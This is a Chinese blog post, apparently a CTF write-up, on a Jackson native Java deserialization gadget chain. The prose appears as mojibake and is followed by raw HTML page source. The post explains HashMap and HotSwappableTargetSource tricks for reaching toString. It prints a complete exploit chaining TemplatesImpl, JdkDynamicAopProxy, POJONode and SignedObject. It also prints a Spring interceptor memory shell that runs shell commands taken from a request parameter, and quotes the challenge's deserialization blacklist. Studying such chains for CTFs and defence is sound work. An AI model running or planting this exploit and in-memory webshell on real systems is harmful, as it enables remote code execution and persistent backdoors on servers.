è¿™ä¸ªæ˜¯å‰é¢çš„è§¦å‘çš„åˆ©ç”¨è¿ï¼Œæˆ‘ä»¬ç®€å•åˆ†æä¸‹é“¾å­ï¼Œæˆ‘ç¬¬ä¸€çœ¼çœ‹è¿™ä¸ªé“¾å­å°±æƒ³ä¸ºå•¥è¦HotSwappableTargetSource#equalsè¿™æ­¥ï¼Œç›´æ¥XString#equalsä¸å¥½ä¹ˆã€‚æˆ‘ä»¬å¼€å§‹åˆ†æ\nä¸€å¼€å§‹æˆ‘å°±é‡åˆ°äº†å›°éš¾ç‚¹ï¼Œæˆ‘æ˜¯è°ƒç”¨elseä¸­çš„key.equals(k)æ¥è§¦å‘åé¢çš„é“¾å­ï¼Œä½†æ˜¯æˆ‘ä»¬è¿›å…¥elseå¹¶ä¸å®¹æ˜“\né—®é¢˜1 putVal tab è¿™é‡Œå¯ä»¥çœ‹åˆ°pæ˜¯ä»tabä¸­å–å€¼çš„ï¼Œå…¶ä¸­iè¿˜æ˜¯é€šè¿‡andå’Œhashè¿ç®—ï¼Œè¿™é‡Œæ˜æ˜¾ä¸€æ¬¡putValæ–¹æ³•ä¸å¤Ÿï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡ç»™tab[i],ç¬¬äºŒæ¬¡è°ƒç”¨ç¬¬ä¸€æ¬¡çš„tab[i]\nHashmap#readObject ä¸­ä¹Ÿæ˜¯forè°ƒç”¨putValï¼Œä¸Šé¢æƒ³æ³•å¯ä»¥å®ç°\nfor (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } mappings é€šè¿‡putVal()ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬çŸ¥é“è¦è¿›å…¥elseï¼Œç¬¬äºŒæ¬¡çš„iè¦å’Œç¬¬ä¸€æ¬¡çš„iä¸€æ ·ï¼Œæ‰èƒ½è®©\n(p = tab[i = (n - 1) \u0026 hash]) != null (è¿™é‡Œæ˜¯ä¸ç­‰äºï¼Œmdæ ¼å¼çš„é—®é¢˜) åŠä¸¤æ¬¡çš„keyçš„hashå€¼è¦ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯é—´æ¥keyè¦ä¸€æ ·å’¯ï¼Ÿï¼Œä½†æ˜¯èµ‹å€¼ç›´æ¥putçš„è¯ï¼Œåªä¼šæœ‰ä¸€å¯¹å€¼ï¼Œè¦†ç›–ç¬¬ä¸€ä¸ªvalueã€‚è€Œputä¹Ÿæ˜¯è°ƒç”¨çš„putVal()ï¼Œä¼šåˆ¤æ–­keyçš„hashï¼Œä¸€æ ·çš„è¯å¹¶ä¸ä¼šå¤šåŠ ä¸€å¯¹å€¼ã€‚\npublic V put(K key, V value) { return putVal(hash(key), key, value, false, true); } è¿™é‡Œä¸»è¦åŸå› æ˜¯è¿™ä¸ªhashå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒå€¼å¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªputVal()æ¥èµ‹å€¼ï¼Œhashæˆ‘ä»¬å¯ä»¥éšä¾¿è®¾ç½®ï¼Œå› ä¸ºreadObjectçš„æ—¶å€™ï¼Œhashå€¼è¿˜æ˜¯å»é€šè¿‡hash(key)å»è·å–çš„ï¼Œå¹¶ä¸å½±å“\nHashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\"111\"); //hashMap.put(hotSwappableTargetSource,\"222\"); Method putVal = hashMap.getClass().getDeclaredMethod(\"putVal\", int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\"222\",false,true); key hashçš„é—®é¢˜è§£å†³äº†ï¼Œæœ‰ä¸ªç©¶æé—®é¢˜ï¼ˆä¸¤æ¬¡çš„keyä¸èƒ½ç›¸ç­‰ï¼‰\nçœ‹åˆ°è¿™é‡Œè¿›å…¥elseä¹‹åçš„è¿™ä¸ªifåˆ¤æ–­ï¼Œè¿™é‡Œ||å¦‚æœå‰é¢ä¸ºtrueäº†çš„è¯å°±ä¸ä¼šæ‰§è¡Œåé¢çš„key.equals(k)æ–¹æ³•è¿›è¡Œåˆ¤æ–­äº†\nif (p.hash == hash \u0026\u0026 ((k = p.key) == key || (key != null \u0026\u0026 key.equals(k)))) Hashmap#hash\nstatic final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } ä½†æ˜¯å¸¸è§„æ€è·¯ï¼Œè¿™ä¸ªæ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºhashå€¼è¦ä¸€æ ·æ„å‘³ç€keyä¸€æ ·ï¼Œè€Œè¿™é‡Œå´è¦keyä¸ç›¸åŒï¼â€”â€”ï¼ï¼Œé™¤éä»–hashCode()æœ‰é»‘é­”æ³•å˜¿å˜¿\nè¿™é‡Œä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦å¥—ä¸€å±‚HSTSçš„åŸå› \nHSTS æˆ‘çš„ç¥ è¿™å®¶ä¼™hashCodeæ–¹æ³•å®Œç¾è§£å†³çš„äº†è¿™ä¸ªé—®é¢˜ï¼Œå…¶è¿”å›çš„æ˜¯ä¸€ä¸ªå›ºå®šå€¼æˆ‘å»ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾è®¡ï¼Œä»é€»è¾‘ä¸Šçœ‹å…¶å®ç®—ä¸ªç¼ºé™·ï¼Œä¸ç¬¦åˆé€»è¾‘å‘€hhhï¼‰\n@Override public int hashCode() { return HotSwappableTargetSource.class.hashCode(); } æ‰€ä»¥è¿™é‡Œkeyéƒ½ç”¨HotSwappableTargetSource\nåé¢å°±æ¯”è¾ƒé¡ºåˆ©äº†ï¼Œæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè¿™é‡Œæ³¨æ„ä¸‹ç¬¬ä¸€ä¸ªXStringè¦ç”¨Stringé‚£ä¸ªæ„é€ æ–¹æ³•ï¼Œå› ä¸ºstr()é‡ŒStringè½¬ä¹‰å¯èƒ½æŠ¥é”™ä¸­æ–­\npoc è¿™é‡Œpocè¿˜å¤¹æ‚ç€SignedObject(äºŒæ¬¡ååºåˆ—åŒ–)å’ŒJdkDynamicAopProxy(ç¨³å®šè§¦å‘getOutputProperties)ï¼Œspringå†…å­˜é©¬\nå› ä¸ºé¢˜ç›®éœ€è¦è¿™äº›ï¼Œç„¶åç›¸å…³ä»£ç å’Œé™„ä»¶æˆ‘ä¹Ÿä¼šæ”¾åˆ°pocä¸‹é¢\nimport com.fasterxml.jackson.databind.node.POJONode; import com.govuln.shiroattack.Evil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xml.internal.utils.XMLString; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.target.HotSwappableTargetSource; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.*; import java.security.*; import java.util.HashMap; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Interceptor_demo.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); Class\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); // ç”Ÿæˆç§é’¥å’Œå…¬é’¥ KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\"RSA\"); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // åˆ›å»ºç­¾åå¼•æ“ Signature signingEngine = Signature.getInstance(\"SHA256withRSA\"); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); // BadAttributeValueExpException bad=new BadAttributeValueExpException(111); // setFiled(bad,\"val\",node); XString xString = new XString(\"123\"); Constructor\u003cXString\u003e Constructor = XString.class.getDeclaredConstructor(Object.class); Constructor.setAccessible(true); //XString xString = Constructor.newInstance(new XString(\"123\")); XString xString2 = Constructor.newInstance(node); HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString); HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(node); HashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\"111\"); //hashMap.put(hotSwappableTargetSource,\"222\"); Method putVal = hashMap.getClass().getDeclaredMethod(\"putVal\", int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\"222\",false,true); // Field modCount = hashMap.getClass().getDeclaredField(\"size\"); // modCount.setAccessible(true); // modCount.set(hashMap,2); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ String base64EncodedData = \"\"; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // ååºåˆ—åŒ– ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new MyObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } MyObjectInputStream\nè¿™ä¸ªæ˜¯é¢˜ç›®çš„è¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†CC5å¼€å¤´\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // import java.io.IOException; import java.io.InputStream; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class MyObjectInputStream extends ObjectInputStream { private static final String[] blackList = new String[]{\"AbstractTranslet\", \"Templates\", \"TemplatesImpl\", \"javax.management\", \"swing\", \"awt\", \"fastjson\"}; public MyObjectInputStream(InputStream in) throws IOException { super(in); } protected MyObjectInputStream() throws IOException, SecurityException { } protected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String[] var2 = blackList; int var3 = var2.length; for(int var4 = 0; var4 \u003c var3; ++var4) { String black = var2[var4]; if (desc.getName().contains(black)) { throw new InvalidClassException(\"Unauthorized deserialization attempt\", desc.getName()); } } return super.resolveClass(desc); } } Interceptor_demo\nè¿™ä¸ªæ˜¯æˆ‘è‡ªå·±å†™çš„springçš„Interceptorå†…å­˜é©¬\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.aopalliance.intercept.Interceptor; import org.springframework.lang.Nullable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintWriter; import java.lang.reflect.Method; @RestController public class Interceptor_demo extends AbstractTranslet implements HandlerInterceptor,Interceptor { public Interceptor_demo() throws Exception { System.out.println(\"main\"); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } bean.setInterceptors(new Interceptor[]{new Interceptor_demo(\"a\")}); Class\u003c?\u003e aClass2 = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\"); Method initApplicationContext = aClass2.getDeclaredMethod(\"initApplicationContext\"); initApplicationContext.setAccessible(true); initApplicationContext.invoke(bean); System.out.println(\"1111111111111111111111\"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public Interceptor_demo(String a) { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String precmd = request.getParameter(\"precmd\"); if (precmd!= null \u0026\u0026!precmd.isEmpty()) { try { Process process = Runtime.getRuntime().exec(precmd); InputStreamReader isr = new InputStreamReader(process.getInputStream()); BufferedReader br = new BufferedReader(isr); response.setContentType(\"text/plain\"); PrintWriter writer = response.getWriter(); String line; while ((line = br.readLine())!= null) { writer.write(line + \"\\n\"); } br.close(); isr.close(); } catch (IOException e) { response.setContentType(\"text/plain\"); PrintWriter writer = response.getWriter(); writer.write(\"æ‰§è¡Œå‘½ä»¤æ—¶å‡ºç°å¼‚å¸¸: \" + e.getMessage()); writer.close(); } } System.out.println(\"preprepreprepreprepre\"); // è¿™é‡Œå¯ä»¥è¿›è¡Œæƒé™éªŒè¯ç­‰æ“ä½œï¼Œå¦‚æœéªŒè¯ä¸é€šè¿‡å¯ä»¥è¿”å› false ä¸­æ–­è¯·æ±‚å¤„ç† return true; } // public Interceptor_demo(String a) { // } public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView mv) throws Exception { System.out.println(\"postpostpostpostpost\"); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws IOException { System.out.println(\"afterafterafterafter\"); } } æœ€åæˆåŠŸåˆ©ç”¨hhh\né¢˜ç›®é™„ä»¶ï¼š6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xTlBBUlhLLWNrWGNTQU9QVHlybGxLUT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=ï¼ˆè‡ªè¡ŒBase64è§£ç ï¼‰ å‚è€ƒï¼š\nhttps://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload\nhttps://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD\n2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›åˆèµ› secObj\n",
  "wordCount" : "5600",
  "inLanguage": "zh",
  "datePublished": "2024-11-14T20:01:23+08:00",
  "dateModified": "2024-11-14T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      jacksonåŸç”Ÿé“¾
    </h1>
    <div class="post-meta"><span title='2024-11-14 20:01:23 +0800 CST'>2024-11-14</span>&nbsp;Â·&nbsp;12 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e7%8e%af%e5%a2%83" aria-label="ç¯å¢ƒ">ç¯å¢ƒ</a></li>
                    <li>
                        <a href="#0x01-writevalueasstring" aria-label="0x01 writeValueAsString">0x01 writeValueAsString</a></li>
                    <li>
                        <a href="#0x02-pojonode" aria-label="0x02 POJONode">0x02 POJONode</a></li>
                    <li>
                        <a href="#0x03-gadgets" aria-label="0x03 Gadgets">0x03 Gadgets</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-writereplace" aria-label="é—®é¢˜1 writeReplace()">é—®é¢˜1 writeReplace()</a></li></ul>
                        
                    <li>
                        <a href="#%e5%ad%98%e6%a1%a31-basejsonnode" aria-label="å­˜æ¡£1 BaseJsonNode">å­˜æ¡£1 BaseJsonNode</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e4%b8%8d%e7%a8%b3%e5%ae%9a" aria-label="0x04 ä¸ç¨³å®š">0x04 ä¸ç¨³å®š</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e8%a7%a3%e5%86%b3" aria-label="è§£å†³">è§£å†³</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x05-jdkdynamicaopproxy" aria-label="0x05 JdkDynamicAopProxy">0x05 JdkDynamicAopProxy</a></li>
                    <li>
                        <a href="#0x06-poc" aria-label="0x06 poc">0x06 poc</a></li>
                    <li>
                        <a href="#0x07-%e5%8f%a6%e4%b8%80%e7%a7%8d%e8%a7%a6%e5%8f%91tostring" aria-label="0x07 å¦ä¸€ç§è§¦å‘tostring">0x07 å¦ä¸€ç§è§¦å‘tostring</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-putval" aria-label="é—®é¢˜1 putVal">é—®é¢˜1 putVal</a></li>
                    <li>
                        <a href="#hsts-%e6%88%91%e7%9a%84%e7%a5%9e" aria-label="HSTS æˆ‘çš„ç¥">HSTS æˆ‘çš„ç¥</a></li></ul>
                        
                    <li>
                        <a href="#poc" aria-label="poc">poc</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="ç¯å¢ƒ">ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#ç¯å¢ƒ">#</a></h1>
<p>jacksonç‰ˆæœ¬å¤ªè€çš„è¯ï¼Œ<code>POJONode</code>ä¸­ä»£ç ä¼šä¸å¯¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-databind<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jackson-annotations<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><h1 id="0x01-writevalueasstring">0x01 writeValueAsString<a hidden class="anchor" aria-hidden="true" href="#0x01-writevalueasstring">#</a></h1>
<p>è¿™é‡Œæˆ‘ä»¬jackson åŸç”Ÿé“¾ï¼Œåˆ©ç”¨ç‚¹è·Ÿ<code>writeValueAsString()</code>æœ‰å…³ï¼Œä»–ç”¨æ¥å°†<strong>javaå¯¹è±¡</strong><code>åºåˆ—åŒ–</code>æˆ<strong>jsonå­—ç¬¦ä¸²</strong>ï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼š<code>è°ƒç”¨javaå¯¹è±¡çš„getteræ–¹æ³•</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œçœ‹ä¸‹åºåˆ—åŒ–çš„æ—¶å€™æ˜¯æ€ä¹ˆè°ƒç”¨getteræ–¹æ³•çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">_accessorMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="p">)</span><span class="w"> </span><span class="n">member</span><span class="p">.</span><span class="na">getMember</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p><strong>è®¾ç½®getteræ–¹æ³•ï¼Œè°ƒç”¨æ ˆ</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">234</span><span class="p">,</span> <span class="n">BeanPropertyWriter</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buildWriter</span><span class="p">:</span><span class="mi">229</span><span class="p">,</span> <span class="n">PropertyBuilder</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_constructWriter</span><span class="p">:</span><span class="mi">791</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findBeanProperties</span><span class="p">:</span><span class="mi">583</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
